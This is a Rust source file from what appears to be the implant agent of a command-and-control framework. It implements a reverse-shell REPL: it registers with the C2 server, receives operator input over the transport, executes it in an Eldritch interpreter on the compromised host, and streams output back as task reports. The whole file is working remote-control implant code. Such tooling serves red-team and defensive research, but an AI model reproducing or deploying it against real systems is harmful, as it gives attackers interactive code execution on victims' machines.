use anyhow::Result;
use crossterm::{QueueableCommand, cursor, terminal};
use eldritch_core::Value;
use eldritch_libagent::agent::Agent;
use eldritch_repl::{Repl, ReplAction};
use eldritchv2::{Interpreter, Printer, Span};
use pb::c2::{
    ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
    TaskError, TaskOutput,
};
use std::fmt;
use std::io::{BufWriter, Write};
use std::sync::Arc;
use transport::Transport;

use crate::agent::ImixAgent;
use crate::shell::parser::InputParser;
use crate::shell::terminal::{VtWriter, render};

pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
    task_id: i64,
    mut transport: T,
    agent: ImixAgent<T>,
) -> Result<()> {
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting repl_reverse_shell (task_id={task_id})");

    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    transport.reverse_shell(output_rx, input_tx).await?;

    run_repl_loop(task_id, input_rx, output_tx, agent).await;
    Ok(())
}

async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
    task_id: i64,
    mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
    output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    agent: ImixAgent<T>,
) {
    let _ = tokio::task::spawn_blocking(move || {
        let printer = Arc::new(ShellPrinter {
            tx: output_tx.clone(),
            task_id,
            agent: agent.clone(),
        });

        let sync_transport = agent.get_sync_transport();
        let repl_handler: Option<Arc<dyn eldritchv2::pivot::ReplHandler>> =
            Some(Arc::new(agent.clone()));

        let mut interpreter = Interpreter::new_with_printer(printer)
            .with_default_libs()
            .with_task_context::<crate::assets::Asset>(
            Arc::new(agent.clone()),
            sync_transport,
            repl_handler,
            task_id,
            Vec::new(),
        );
        let mut repl = Repl::new();
        let stdout = VtWriter {
            tx: output_tx.clone(),
            task_id,
        };
        let mut stdout = BufWriter::new(stdout);

        let _ = render(&mut stdout, &repl, None);

        let mut parser = InputParser::new();
        let mut previous_buffer = String::new();

        while let Some(msg) = input_rx.blocking_recv() {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                let _ = output_tx.blocking_send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: msg.data,
                    task_id,
                });
                continue;
            }
            if msg.data.is_empty() {
                continue;
            }

            let inputs = parser.parse(&msg.data);
            let mut pending_render = false;

            for (i, input) in inputs.iter().enumerate() {
                #[cfg(debug_assertions)]
                log::info!("Handling input: {input:?}");
                let action = repl.handle_input(input.clone());
                match action {
                    ReplAction::Render => {
                        pending_render = true;
                    }
                    other => {
                        if pending_render {
                            let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                            previous_buffer = repl.get_render_state().buffer;
                            pending_render = false;
                        }

                        match other {
                            ReplAction::Quit => return,
                            ReplAction::Submit { code, .. } => {
                                let _ = stdout.write_all(b"\r\n");
                                let _ = stdout.flush();

                                match interpreter.interpret(&code) {
                                    Ok(v) => {
                                        if !matches!(v, Value::None) {
                                            let s = format!("{v:?}\r\n");
                                            let _ = stdout.write(s.as_bytes());
                                        }
                                    }
                                    Err(e) => {
                                        let s = format!("Error: {e}");
                                        let s_crlf = s.replace('\n', "\r\n");
                                        let final_s = format!("{s_crlf}\r\n");
                                        let _ = stdout.write(final_s.as_bytes());
                                    }
                                }
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear();
                            }
                            ReplAction::AcceptLine { .. } => {
                                let _ = stdout.write_all(b"\r\n");
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear();
                            }
                            ReplAction::ClearScreen => {
                                let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                                let _ = stdout.queue(cursor::MoveTo(0, 0));
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::Complete => {
                                let state = repl.get_render_state();
                                let (start, completions) =
                                    interpreter.complete(&state.buffer, state.cursor);
                                repl.set_suggestions(completions, start);
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::None => {}
                            ReplAction::Render => unreachable!(),
                        }
                    }
                }

                if i == inputs.len() - 1 && pending_render {
                    let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                    previous_buffer = repl.get_render_state().buffer;
                    pending_render = false;
                }
            }
        }
    })
    .await;
}

struct ShellPrinter<T: Transport> {
    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
    agent: ImixAgent<T>,
}

impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ShellPrinter")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
    fn print_out(&self, _span: &Span, s: &str) {
        let s_crlf = s.replace('\n', "\r\n");
        let display_s = format!("{s_crlf}\r\n");
        let _ = self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data: display_s.into_bytes(),
            task_id: self.task_id,
        });

        let req = ReportTaskOutputRequest {
            output: Some(TaskOutput {
                id: self.task_id,
                output: format!("{s}\n"),
                error: None,
                exec_started_at: None,
                exec_finished_at: None,
            }),
        };
        let _ = self.agent.get_sync_transport().report_task_output(req);
    }

    fn print_err(&self, _span: &Span, s: &str) {
        let s_crlf = s.replace('\n', "\r\n");
        let display_s = format!("{s_crlf}\r\n");
        let _ = self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data: display_s.into_bytes(),
            task_id: self.task_id,
        });

        let req = ReportTaskOutputRequest {
            output: Some(TaskOutput {
                id: self.task_id,
                output: String::new(),
                error: Some(TaskError {
                    msg: format!("{s}\n"),
                }),
                exec_started_at: None,
                exec_finished_at: None,
            }),
        };
        let _ = self.agent.get_sync_transport().report_task_output(req);
    }
}
